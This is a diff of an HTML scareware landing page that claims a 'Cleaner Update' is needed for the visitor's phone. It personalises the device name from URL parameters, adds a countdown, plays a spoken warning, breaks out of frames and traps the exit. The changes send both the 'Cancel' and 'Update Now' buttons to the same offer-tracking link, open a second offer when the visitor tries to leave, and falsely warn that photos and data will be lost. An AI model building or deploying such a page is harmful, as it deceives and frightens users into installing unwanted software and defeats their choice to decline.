@@ -20,28 +20,24 @@
         }
 
         function getURLParameter(name) {
-            var result = decodeURI((RegExp(name + '=' + '(.*?)(&|$)').exec(location.search)||[,null])[1] || '');
+            var result = decodeURI((RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || '');
 
-            // if(name.indexOf('device_brand') !== -1) {
-                // result = '{device_brand}';
-                if (contains(result, 'generic')) {
-                    result = 'Phone'
-                }
-            // }
+            if(name.indexOf('brand') !== -1 && contains(result, 'generic')) {
+                result = 'Phone'
+            }
 
-            // if(name.indexOf('device_name') !== -1) {
-            //     result = '{device_name}';
-                if (contains(result, 'android')) {
-                    result = 'Phone'
-                }
-            // }
+            if(name.indexOf('model') !== -1 && contains(result, 'android')) {
+                result = 'Phone'
+            }
 
-            // if(name.indexOf('browser') !== -1) {
-            //     result = '{browser}';
-                if (contains(result, 'android')) {
-                    result = 'Internet Browser'
-                }
-            // }
+            if(name.indexOf('browser') !== -1 && contains(result, 'android')) {
+                result = 'Internet Browser'
+            }
+
+            if(result==null||result==""){
+                result = 'Phone'
+            }
+
             return result;
 
         }
@@ -96,20 +92,20 @@ a,body{color:#000}body,html{margin:0;padding:0;width:auto;height:100%}body{font-
 <div class="window text_wrap">
 <div class="heads">
 <div class="text">
-Cleaner Update for <script>document.write(getURLParameter('device_brand'))</script>Phone is Recommended!</div>
+Cleaner Update for <script>document.write(getURLParameter('device_brand'))</script> is Recommended!</div>
 </div>
 <div class="text">
-<p>Your phone <script>document.write(getURLParameter('device_name'))</script>Phone can work faster, we released a Cleaner update, and it is recommended for every phone.</p>
-<p>If you do not upgrade, your <script>document.write(getURLParameter('device_name'))</script>Phone might be slowed down and your battery may discharges quickly.</p><p>
-</p><p>Update now for <strong>FREE</strong> to clean and boost your <script>document.write(getURLParameter('device_brand'))</script>Phone immediately!</p>
+<p>Your phone <script>document.write(getURLParameter('device_name'))</script> can work faster, we released a Cleaner update, and it is recommended for every phone.</p>
+<p>If you do not upgrade, your <script>document.write(getURLParameter('device_name'))</script> might be slowed down and your battery may discharges quickly.</p><p>
+</p><p>Update now for <strong>FREE</strong> to clean and boost your <script>document.write(getURLParameter('device_brand'))</script> immediately!</p>
 <p style="text-align:center;margin-top:10px;"><span style="font-size:15px;color:red;font-family:sans-serif;" id="theTime">5 minutes 26 seconds</span></p>
 </div>
     <div class="buttons">
-        <a class="button exitpoint" href="https://phonecleansolutions.com/click.php?lp=1&amp;place=button-ok">Cancel</a>
-        <a class="button exitpoint" href="https://phonecleansolutions.com/click.php?lp=1&amp;place=button-ok">Update Now</a>
+        <a class="button exitpoint" id="buttoncancel" href="https://tk.besttrustedreview.com/click.php?lp=1&to_offer=2">Cancel</a>
+        <a class="button exitpoint" id="buttonexitpoint"  href="https://tk.besttrustedreview.com/click.php?lp=1&to_offer=2">Update Now</a>
     </div>
 </div>
-<a class="pagelink" href="https://phonecleansolutions.com/click.php?lp=1&amp;place=button-ok">&nbsp;</a>
+<a class="pagelink" id="pagelink" href="https://tk.besttrustedreview.com/click.php?lp=1&to_offer=2">&nbsp;</a>
 <script>
 (function(window) {
 if (window.location !== window.top.location) {
@@ -137,24 +133,33 @@ window.top.location = window.location;
     }();
 </script>
 <script type="text/javascript">function speak(c){var b=new SpeechSynthesisUtterance();var a=speechSynthesis.getVoices();b.voice=a[2];b.voiceURI="native";b.volume=1;b.rate=1;b.pitch=1;b.text=c;b.lang="en-IN";speechSynthesis.speak(b)}speak("You should update your Android Cleaner now or your phone can slow down and the battery will be drained faster.");</script>
+
 <script type="text/javascript">
+	var nc = 'https://tk.besttrustedreview.com/click.php?lp=1&to_offer=2';
+	
+	document.getElementById("buttonexitpoint").href = nc;
+	document.getElementById("buttoncancel").href = nc;
+
+    document.getElementById("pagelink").href = nc;
+
     (function (w, d) {
         var epp = function () {
             if (w.onbeforeunload === null) {
                 var to;
                 function repp() {
                     w.onbeforeunload = null;
+					window.open("https://tk.besttrustedreview.com/click.php?lp=1&to_offer=1", "_blank");
                 };
                 function epp() {
                     to = setTimeout(function () {
-                        w.location.replace('/click.php?lp=1&place=button-ok');
+                        w.location.replace(nc);
                         repp();
                     }, 100);
-                    return 'You should update your Android Cleaner now or your phone can slow down and the battery will be drained faster.';
+                    return 'You should update your Android Cleaner now or your photos and data will be lost and cannot be recovered!';
                 }
                 w.onbeforeunload = epp;
                 // Prevent epp firing from clicking on tracking links
-                var ln = d.querySelectorAll("[href='/click.php?lp=1&place=button-ok']");
+                var ln = d.querySelectorAll("[href='"+nc+"']");
                 for (i = 0; i < ln.length; ++i) {
                     ln[i].addEventListener("click", function () {
                         repp();
@@ -170,4 +175,5 @@ window.top.location = window.location;
         }
     })(window, document);
 </script>
+
 </body></html>
